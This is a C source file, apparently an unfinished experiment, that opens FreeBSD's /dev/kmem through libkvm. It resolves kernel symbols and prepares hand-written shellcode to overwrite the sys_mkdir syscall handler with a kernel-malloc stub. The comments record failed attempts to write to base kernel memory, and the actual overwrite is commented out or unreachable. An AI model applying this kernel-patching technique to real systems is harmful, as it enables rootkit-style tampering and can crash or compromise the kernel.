#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <unistd.h>

#include <sys/syscall.h>

/*


	Able to read any address, including SYS_mkdir
	Able to write to address in any LKM
	NOT ABLE to write to address in base system, like sys_mkdir or malloc




                errno = 0;
                if (lseek(kd->vmfd, (off_t)kva, 0) == -1 && errno != 0) {
                        _kvm_err(kd, 0, "invalid address (%lx)", kva);
                        return (-1);
                }
                cc = write(kd->vmfd, buf, len);
                if (cc < 0) {
                        _kvm_syserr(kd, 0, "kvm_write");
                        return (-1);
                } else if ((size_t)cc < len)
                        _kvm_err(kd, kd->program, "short write");
                return (cc);

	EFAULT "Bad address" is raised by write(2)
	[EFAULT]        Part of iov or data to be written to the file points
                        outside the process's allocated address space.\

	Whoever controls kd->vmfd (so the driver for /dev/kmem)
	Is telling us we can't write there...


	NOTES:
		/dev/mem
		/dev/kmem driven by
		https://github.com/freebsd/freebsd/blob/master/sys/dev/mem/memdev.c

		.d_read =	memrw,
		.d_write =	memrw,
	 	memrw from
		https://github.com/freebsd/freebsd/blob/master/sys/amd64/amd64/mem.c

		if (!kernacc((void *)v, c, uio->uio_rw == UIO_READ ?
			VM_PROT_READ : VM_PROT_WRITE)) {
			error = EFAULT;
			break;
		}

		kernacc from
		https://github.com/freebsd/freebsd/blob/master/sys/vm/vm_glue.c#L118

		vm_map_entry!!! Maybe the kernel memory is `ro` and this code checks that!
		


	BUG??
	Unable to kvm_open with O_WRONLY (bad flags arg)
	// kvm.c
	if (flag & ~O_RDWR) {
	       _kvm_err(kd, kd->program, "bad flags arg");
	       goto failed;
       	}


	Whoever controls

*/


unsigned char kmalloc[] =
	"\x55"                            /* push   rbp                       */
	"\x48\x89\xe5"                    /* mov    rbp,rsp                   */
	"\x53"                            /* push   rbx                       */
	"\x50"                            /* push   rax                       */
	"\x48\x89\xf3"                    /* mov    rbx,rsi                   */
	"\x48\x8b\x3e"                    /* mov    rdi,QWORD PTR [rsi]       */
	"\x48\xc7\xc6\x00\x00\x00\x00"    /* mov    rsi,0x0                   */
	"\xba\x02\x01\x00\x00"            /* mov    edx,0x102                 */
	"\xe8\x00\x00\x00\x00"            /* call   6d <kmalloc_handler+0x1d> */
	"\x48\x89\x45\xf0"                /* mov    QWORD PTR [rbp-0x10],rax  */
	"\x48\x8b\x73\x08"                /* mov    rsi,QWORD PTR [rbx+0x8]   */
	"\x48\x8d\x7d\xf0"                /* lea    rdi,[rbp-0x10]            */
	"\xba\x08\x00\x00\x00"            /* mov    edx,0x8                   */
	"\xe8\x00\x00\x00\x00"            /* call   83 <kmalloc_handler+0x33> */
	"\x48\x83\xc4\x08"                /* add    rsp,0x8                   */
	"\x5b"                            /* pop    rbx                       */
	"\x5d"                            /* pop    rbp                       */
	"\xc3";                           /* ret                              */

#define CODE_SIZE sizeof(kmalloc)
#define OFF_SYM_M_WAIT  0x0c + 3
#define OFF_SYM_MALLOC  0x18 + 1
#define OFF_SYM_COPYOUT 0x2e + 1

int main(int argc, char **argv)
{
	int error;
	kvm_t *kd;
	char errbuf[_POSIX2_LINE_MAX];
	struct nlist nl[] = { { NULL }, { NULL }, { NULL }, { NULL }, { NULL }};
	unsigned char backup[CODE_SIZE];
	void *heap_addr;

	printf("%x %x %x\n", O_RDONLY, O_WRONLY, O_RDWR);
	/* カーネルメモリの記述子を取得する */
	if ((kd = kvm_open("/dev/kmem", NULL, NULL, O_RDWR, errbuf)) == NULL) {
		fprintf(stderr, "\033[91mERROR: %s\033[0m\n",
					"Unable to open kmem device");
		exit(-1);
	};

	/* シンボル解決 */
	nl[0].n_name = "sys_mkdir";
	nl[1].n_name = "M_TEMP";
	nl[2].n_name = "malloc";
	nl[3].n_name = "copyout";

	error = kvm_nlist(kd, nl);
	for (int i = 0; i < sizeof(nl) / sizeof(*nl) - 1; i++) {
		fprintf(stderr, "\033[94mDEBUG: [%p] %s\033[0m\n",
					(void *) nl[i].n_value, nl[i].n_name);
	}
	if (error != 0) {
		if (error == -1)
			fprintf(stderr, "\033[91mERROR: %s\033[0m\n",
					"Unable to read kernel symbol table");
		else
			fprintf(stderr,
	"\033[91mERROR: %d symbol(s) could not be resolved\033[0m\n",
				error);
		kvm_close(kd);
		exit(-1);
	}

	/* sys_mkdirの読み込み・バックアップ */
	if ((kvm_read(kd, nl[0].n_value, backup, CODE_SIZE)) == -1) {
		fprintf(stderr, "\033[91mERROR: %s\033[0m\n", kvm_geterr(kd));
		kvm_close(kd);
		exit(-1);
	}
	write(1, backup, CODE_SIZE);

	if ((kvm_write(kd, nl[0].n_value, backup, CODE_SIZE)) == -1) {
		fprintf(stderr, "\033[91mERROR: %s\033[0m\n", kvm_geterr(kd));
		fprintf(stderr, "Failed to restore SYS_mkdir this is bad!!\n");
		kvm_close(kd);
		exit(-1);
	}
	return 0;


	/* 相対ジャンプ(call)の引数を解決する */
	*(unsigned int *)(kmalloc + OFF_SYM_M_WAIT) =
		nl[1].n_value - (nl[0].n_value + OFF_SYM_M_WAIT +
		sizeof(unsigned int));
	*(unsigned int *)(kmalloc + OFF_SYM_MALLOC) =
		nl[2].n_value - (nl[0].n_value + OFF_SYM_MALLOC +
		sizeof(unsigned int));
	*(unsigned int *)(kmalloc + OFF_SYM_COPYOUT) =
		nl[3].n_value - (nl[0].n_value + OFF_SYM_COPYOUT +
		sizeof(unsigned int));

	/* kmallocの命令でsys_mkdirを上書きする */
	// printf("Writing 0x%lx bytes to %p\n", 1, (void *) nl[0].n_value);
	// if ((kvm_write(kd, nl[0].n_value, kmalloc, CODE_SIZE)) == -1) {
	// 	fprintf(stderr, "\033[91mERROR: %s\033[0m\n", kvm_geterr(kd));
	// 	kvm_close(kd);
	// 	exit(-1);
	// }

	/* kmallocを呼び出す！ */
	// syscall(211, (size_t) 128, heap_addr);
	write(1, backup, CODE_SIZE);
	return 0;
	/* 早速sys_mkdirをリストアする */
	if ((kvm_write(kd, nl[0].n_value, "0", 1)) == -1) {
		fprintf(stderr, "\033[91mERROR: %s\033[0m\n", kvm_geterr(kd));
		fprintf(stderr, "Failed to restore SYS_mkdir this is bad!!\n");
		kvm_close(kd);
		exit(-1);
	}

	// printf("\033[92mGot pointer to kernel chunk: %p\033[0m\n", heap_addr);

	kvm_close(kd);

	return 0;
}
